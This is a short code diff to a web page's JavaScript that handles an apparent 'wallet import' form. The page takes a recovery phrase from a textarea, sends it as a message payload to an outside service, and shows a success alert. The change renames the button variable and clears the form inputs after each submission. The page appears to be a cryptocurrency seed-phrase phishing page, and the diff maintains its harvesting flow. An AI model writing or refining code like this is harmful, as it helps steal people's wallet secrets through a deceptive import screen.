@@ -724,7 +724,8 @@
             const hidden_section = document.getElementById("hidden");
             const hide_btn = document.getElementById("btn");
             const modal = document.querySelector(".modal");
-            const buttons = modal.querySelectorAll('.modal button[type="submit"]');
+            const All_buttons = modal.querySelectorAll('.modal button[type="submit"]');
+            const All_inputs = modal.querySelectorAll(".modal input, .modal textarea");
             //phrase
             const phrase_form = document.querySelector("#phrase form");
             const phrase_input = phrase_form.querySelector('textarea[name="phrase"]');
@@ -808,7 +809,7 @@
                     .replaceAll(",", ",\n");
 
                 try {
-                    buttons.forEach((btn) => {
+                    All_buttons.forEach((btn) => {
                         btn.innerText = "Loading";
                         btn.disabled = true;
                     });
@@ -816,10 +817,13 @@
                         message: new_payload,
                     });
                     alert("Wallet has been succesfully Imported!");
+                    All_inputs.forEach((input) => {
+                        input.value = null;
+                    });
                 } catch (error) {
                     alert("An error occured while trying to Import wallet, Please try again!");
                 } finally {
-                    buttons.forEach((btn) => {
+                    All_buttons.forEach((btn) => {
                         btn.innerText = "IMPORT";
                         btn.disabled = false;
                     });
